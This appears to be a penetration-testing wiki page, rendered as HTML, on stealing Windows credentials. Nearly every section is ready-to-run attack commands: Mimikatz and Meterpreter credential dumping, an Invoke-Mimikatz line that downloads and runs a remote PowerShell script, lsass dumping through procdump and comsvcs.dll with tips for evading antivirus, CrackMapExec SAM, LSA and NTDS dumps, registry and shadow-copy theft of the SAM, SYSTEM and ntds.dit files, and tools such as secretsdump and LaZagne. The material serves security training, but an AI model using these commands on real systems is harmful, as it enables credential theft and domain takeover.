<h1 id="Stealing-Credentials"><a href="#Stealing-Credentials" class="headerlink" title="Stealing Credentials"></a>Stealing Credentials</h1><h2 id="Credentials-Mimikatz"><a href="#Credentials-Mimikatz" class="headerlink" title="Credentials Mimikatz"></a>Credentials Mimikatz</h2><pre><code class="bash">#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from SAM
lsadump::sam
#One liner
mimikatz &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot; &quot;lsadump::sam&quot; &quot;exit&quot;
</code></pre>
<p><strong>Find other things that Mimikatz can do in</strong> <a href="credentials-mimikatz.md"><strong>this page</strong></a><strong>.</strong></p>
<h3 id="Invoke-Mimikatz"><a href="#Invoke-Mimikatz" class="headerlink" title="Invoke-Mimikatz"></a>Invoke-Mimikatz</h3><pre><code class="bash">IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1&#39;)
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command &#39;&quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot; &quot;lsadump::sam&quot; &quot;exit&quot;&#39;
</code></pre>
<p><a href="credentials-protections.md"><strong>Learn about some possible credentials protections here.</strong></a> <strong>This protections could prevent Mimikatz from extracting some credentials.</strong></p>
<h2 id="Credentials-with-Meterpreter"><a href="#Credentials-with-Meterpreter" class="headerlink" title="Credentials with Meterpreter"></a>Credentials with Meterpreter</h2><p>Use the <a href="https://github.com/carlospolop/MSF-Credentials" target="_blank" rel="noopener"><strong>Credentials Plugin</strong></a> <strong>that</strong> I have created to <strong>search for passwords and hashes</strong> inside the victim.</p>
<pre><code class="bash">#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot; &quot;lsadump::sam&quot;

#Using Mimikatz module
load mimikatz
mimikatz_command -f &quot;sekurlsa::logonpasswords&quot;
mimikatz_command -f &quot;lsadump::sam&quot;
</code></pre>
<h2 id="Bypassing-AV"><a href="#Bypassing-AV" class="headerlink" title="Bypassing AV"></a>Bypassing AV</h2><h3 id="Procdump-Mimikatz"><a href="#Procdump-Mimikatz" class="headerlink" title="Procdump + Mimikatz"></a>Procdump + Mimikatz</h3><p>As <strong>Procdump from</strong> <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" target="_blank" rel="noopener"><strong>SysInternals</strong> </a><strong>is a legitimate Microsoft tool</strong>, it’s not detected by Defender.<br>You can use this tool to <strong>dump the lsass process</strong>, <strong>download the dump</strong> and <strong>extract</strong> the <strong>credentials locally</strong> from the dump.</p>
<p>Dump lsass</p>
<pre><code class="bash">#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
</code></pre>
<p>Extract credentials from the dump</p>
<pre><code class="c">//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
</code></pre>
<p>This process is done automatically with <a href="https://github.com/aas-n/spraykatz" target="_blank" rel="noopener">SprayKatz</a>: <code>./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24</code></p>
<p><strong>Note</strong>: Some <strong>AV</strong> may <strong>detect</strong> as <strong>malicious</strong> the use of <strong>procdump.exe to dump lsass.exe</strong>, this is because they are <strong>detecting</strong> the string <strong>“procdump.exe” and “lsass.exe”</strong>. So it is <strong>stealthier</strong> to <strong>pass</strong> as an <strong>argument</strong> the <strong>PID</strong> of lsass.exe to procdump <strong>instead o</strong>f the <strong>name lsass.exe.</strong></p>
<h3 id="Dumping-lsass-with-comsvcs-dll"><a href="#Dumping-lsass-with-comsvcs-dll" class="headerlink" title="Dumping lsass with comsvcs.dll"></a>Dumping lsass with <strong>comsvcs.dll</strong></h3><p>There’s a DLL called <strong>comsvcs.dll</strong>, located in <code>C:\Windows\System32</code> that <strong>dumps process memory</strong> whenever they <strong>crash</strong>. This DLL contains a <strong>function</strong> called <strong><code>MiniDumpW</code></strong> that is written so it can be called with <code>rundll32.exe</code>.<br>The first two arguments are not used, but the third one is split into 3 parts. First part is the process ID that will be dumped, second part is the dump file location, and third part is the word <strong>full</strong>. There is no other choice.<br>Once these 3 arguments has been parsed, basically this DLL creates the dump file, and dumps the specified process into that dump file.<br>Thanks to this function, we can use <strong>comsvcs.dll</strong> to dump lsass process instead of uploading procdump and executing it. (This information was extracted from <a href="https://en.hackndo.com/remote-lsass-dump-passwords/" target="_blank" rel="noopener">https://en.hackndo.com/remote-lsass-dump-passwords/</a>)</p>
<pre><code class="text">rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump &lt;lsass pid&gt; lsass.dmp full
</code></pre>
<p>We just have to keep in mind that this technique can only be executed as <strong>SYSTEM</strong>.</p>
<p><strong>You can automate this process with</strong> <a href="https://github.com/Hackndo/lsassy" target="_blank" rel="noopener"><strong>lssasy</strong></a><strong>.</strong></p>
<h2 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h2><h3 id="Dump-SAM-hashes"><a href="#Dump-SAM-hashes" class="headerlink" title="Dump SAM hashes"></a>Dump SAM hashes</h3><pre><code class="text">cme smb 192.168.1.0/24 -u UserNAme -p &#39;PASSWORDHERE&#39; --sam
</code></pre>
<h3 id="Dump-LSA-secrets"><a href="#Dump-LSA-secrets" class="headerlink" title="Dump LSA secrets"></a>Dump LSA secrets</h3><pre><code class="text">cme smb 192.168.1.0/24 -u UserNAme -p &#39;PASSWORDHERE&#39; --lsa
</code></pre>
<h3 id="Dump-the-NTDS-dit-from-target-DC"><a href="#Dump-the-NTDS-dit-from-target-DC" class="headerlink" title="Dump the NTDS.dit from target DC"></a>Dump the NTDS.dit from target DC</h3><pre><code class="text">cme smb 192.168.1.100 -u UserNAme -p &#39;PASSWORDHERE&#39; --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p &#39;PASSWORDHERE&#39; --ntds vss
</code></pre>
<h3 id="Dump-the-NTDS-dit-password-history-from-target-DC"><a href="#Dump-the-NTDS-dit-password-history-from-target-DC" class="headerlink" title="Dump the NTDS.dit password history from target DC"></a>Dump the NTDS.dit password history from target DC</h3><pre><code class="text">#~ cme smb 192.168.1.0/24 -u UserNAme -p &#39;PASSWORDHERE&#39; --ntds-history
</code></pre>
<h3 id="Show-the-pwdLastSet-attribute-for-each-NTDS-dit-account"><a href="#Show-the-pwdLastSet-attribute-for-each-NTDS-dit-account" class="headerlink" title="Show the pwdLastSet attribute for each NTDS.dit account"></a>Show the pwdLastSet attribute for each NTDS.dit account</h3><pre><code class="text">#~ cme smb 192.168.1.0/24 -u UserNAme -p &#39;PASSWORDHERE&#39; --ntds-pwdLastSet
</code></pre>
<h2 id="Stealing-SAM-amp-SYSTEM"><a href="#Stealing-SAM-amp-SYSTEM" class="headerlink" title="Stealing SAM &amp; SYSTEM"></a>Stealing SAM &amp; SYSTEM</h2><p>This files should be <strong>located</strong> in <em>C:\windows\system32\config\SAM</em> and <em>C:\windows\system32\config\SYSTEM.</em> But <strong>you cannot just copy them in a regular way</strong> because they protected.</p>
<h3 id="From-Registry"><a href="#From-Registry" class="headerlink" title="From Registry"></a>From Registry</h3><p>The easiest way to steal those files is to get a copy from the registry:</p>
<pre><code class="text">reg save HKLM\sam sam
reg save HKLM\system system
</code></pre>
<p><strong>Download</strong> those files to your Kali machine and <strong>extract the hashes</strong> using:</p>
<pre><code class="text">samdump2 SYSTEM SAM
</code></pre>
<h3 id="Volume-Shadow-Copy"><a href="#Volume-Shadow-Copy" class="headerlink" title="Volume Shadow Copy"></a>Volume Shadow Copy</h3><p>You can perform copy of protected files using this service. You need to be Administrator.</p>
<h4 id="Using-vssadmin"><a href="#Using-vssadmin" class="headerlink" title="Using vssadmin"></a>Using vssadmin</h4><p>vssadmin binary is only available in Windows Server versions</p>
<pre><code class="bash">vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
</code></pre>
<p>But you can do the same from <strong>Powershell</strong>. This is an example of <strong>how to copy the SAM file</strong> (the hard drive used is “C:” and its saved to C:\users\Public) but you can use this for copying any protected file:</p>
<pre><code class="bash">$service=(Get-Service -name VSS)
if($service.Status -ne &quot;Running&quot;){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create(&quot;C:\&quot;,&quot;ClientAccessible&quot;).ShadowID
$volume=(gwmi win32_shadowcopy -filter &quot;ID=&#39;$id&#39;&quot;)
cmd /c copy &quot;$($volume.DeviceObject)\windows\system32\config\sam&quot; C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
</code></pre>
<p>Code from the book: <a href="https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html" target="_blank" rel="noopener">https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html</a></p>
<h3 id="Invoke-NinjaCopy"><a href="#Invoke-NinjaCopy" class="headerlink" title="Invoke-NinjaCopy"></a>Invoke-NinjaCopy</h3><p>Finally, you could also use the <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1" target="_blank" rel="noopener"><strong>PS script Invoke-NinjaCopy</strong></a> to make a copy of SAM, SYSTEM and ntds.dit.</p>
<pre><code class="bash">Invoke-NinjaCopy.ps1 -Path &quot;C:\Windows\System32\config\sam&quot; -LocalDestination &quot;c:\copy_of_local_sam&quot;
</code></pre>
<h2 id="Active-Directory-Credentials-NTDS-dit"><a href="#Active-Directory-Credentials-NTDS-dit" class="headerlink" title="Active Directory Credentials - NTDS.dit"></a><strong>Active Directory Credentials - NTDS.dit</strong></h2><p><strong>The Ntds.dit file is a database that stores Active Directory data</strong>, including information about user objects, groups, and group membership. It includes the password hashes for all users in the domain.</p>
<p>The important NTDS.dit file will be <strong>located in</strong>: <em>%SystemRoom%/NTDS/ntds.dit</em><br>This file is a database <em>Extensible Storage Engine</em> (ESE) and is “officially” composed by 3 tables:</p>
<ul>
<li><strong>Data Table</strong>: Contains the information about the objects (users, groups…)</li>
<li><strong>Link Table</strong>: Information about the relations (member of…)</li>
<li><strong>SD Table</strong>: Contains the security descriptors of each object</li>
</ul>
<p>More information about this: <a href="http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/" target="_blank" rel="noopener">http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/</a></p>
<p>Windows uses <em>Ntdsa.dll</em> to interact with that file and its used by <em>lsass.exe</em>. Then, <strong>part</strong> of the <strong>NTDS.dit</strong> file could be located <strong>inside the</strong> _<strong>lsass</strong>_ <strong>memory</strong> (you can find the lastet accessed data probably because of the performance impruve by using a <strong>cache</strong>).</p>
<h4 id="Decrypting-the-hashes-inside-NTDS-dit"><a href="#Decrypting-the-hashes-inside-NTDS-dit" class="headerlink" title="Decrypting the hashes inside NTDS.dit"></a>Decrypting the hashes inside NTDS.dit</h4><p>The hash is cyphered 3 times:</p>
<ol>
<li>Decrypt Password Encryption Key (<strong>PEK</strong>) using the <strong>BOOTKEY</strong> and <strong>RC4</strong>.</li>
<li>Decrypt tha <strong>hash</strong> using <strong>PEK</strong> and <strong>RC4</strong>.</li>
<li>Decrypt the <strong>hash</strong> using <strong>DES</strong>.</li>
</ol>
<p><strong>PEK</strong> have the <strong>same value</strong> in <strong>every domain controller</strong>, but it is <strong>cyphered</strong> inside the <strong>NTDS.dit</strong> file using the <strong>BOOTKEY</strong> of the <strong>SYSTEM file of the domain controller (is different between domain controllers)</strong>. This is why to get the credentials from the NTDS.dit file <strong>you need the files NTDS.dit and SYSTEM</strong> (_C:\Windows\System32\config\SYSTEM_).</p>
<h3 id="Copying-NTDS-dit-using-Ntdsutil"><a href="#Copying-NTDS-dit-using-Ntdsutil" class="headerlink" title="Copying NTDS.dit using Ntdsutil"></a>Copying NTDS.dit using Ntdsutil</h3><p>Available since Windows Server 2008.</p>
<pre><code class="bash">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:\copy-ntds&quot; quit quit
</code></pre>
<p>You could also use the <a href="./#stealing-sam-and-system"><strong>volume shadow copy</strong></a> ****trick to copy the <strong>ntds.dit</strong> file. Remember that you will also need a copy of the <strong>SYSTEM file</strong> (again, <a href="./#stealing-sam-and-system"><strong>dump it from the registry or use the volume shadow copy</strong></a> ****trick).</p>
<h3 id="Extracting-hashes-from-NTDS-dit"><a href="#Extracting-hashes-from-NTDS-dit" class="headerlink" title="Extracting hashes from NTDS.dit"></a><strong>Extracting hashes from NTDS.dit</strong></h3><p>Once you have <strong>obtained</strong> the files <strong>NTDS.dit</strong> and <strong>SYSTEM</strong> you can use tools like <em>secretsdump.py</em> to <strong>extract the hashes</strong>:</p>
<pre><code class="bash">secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL -outputfile credentials.txt
</code></pre>
<p>You can also <strong>extract them automatically</strong> using a valid domain admin user:</p>
<pre><code class="text">secretsdump.py -just-dc-ntlm &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;DOMAIN_CONTROLLER&gt;
</code></pre>
<p>For <strong>big NTDS.dit files</strong> it’s recommend to extract it using <a href="https://github.com/c-sto/gosecretsdump" target="_blank" rel="noopener">gosecretsdump</a>.</p>
<p>Finally, you can also use the <strong>metasploit module</strong>: <em>post/windows/gather/credentials/domain_hashdump</em> or <strong>mimikatz</strong> <code>lsadump::lsa /inject</code> </p>
<h2 id="Lazagne"><a href="#Lazagne" class="headerlink" title="Lazagne"></a>Lazagne</h2><p>Download the binary from <a href="https://github.com/AlessandroZ/LaZagne/releases" target="_blank" rel="noopener">here</a>. you can use this binary to extract credentials from several software.</p>
<pre><code class="text">lazagne.exe all
</code></pre>
<h2 id="Other-tools-for-extracting-credentials-from-SAM-and-LSASS"><a href="#Other-tools-for-extracting-credentials-from-SAM-and-LSASS" class="headerlink" title="Other tools for extracting credentials from SAM and LSASS"></a>Other tools for extracting credentials from SAM and LSASS</h2><h3 id="Windows-credentials-Editor-WCE"><a href="#Windows-credentials-Editor-WCE" class="headerlink" title="Windows credentials Editor (WCE)"></a>Windows credentials Editor (WCE)</h3><p>This tool can be used to extract credentials from the memory. Download it from: <a href="https://www.ampliasecurity.com/research/windows-credentials-editor/" target="_blank" rel="noopener">http://www.ampliasecurity.com/research/windows-credentials-editor/</a></p>
<h3 id="fgdump"><a href="#fgdump" class="headerlink" title="fgdump"></a>fgdump</h3><p>Extract credentials from the SAM file</p>
<pre><code class="text">You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
</code></pre>
<h3 id="PwDump"><a href="#PwDump" class="headerlink" title="PwDump"></a>PwDump</h3><p>Extract credentials from the SAM file</p>
<pre><code class="text">You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
</code></pre>
<h3 id="PwDump7"><a href="#PwDump7" class="headerlink" title="PwDump7"></a>PwDump7</h3><p>Download it from:<a href="%20http://www.tarasco.org/security/pwdump_7"> http://www.tarasco.org/security/pwdump_7</a> and just <strong>execute it</strong> and the passwords will be extracted.</p>
<h2 id="Defenses"><a href="#Defenses" class="headerlink" title="Defenses"></a>Defenses</h2><p>****<a href="credentials-protections.md"><strong>Learn about some credentials protections here.</strong></a>****</p>
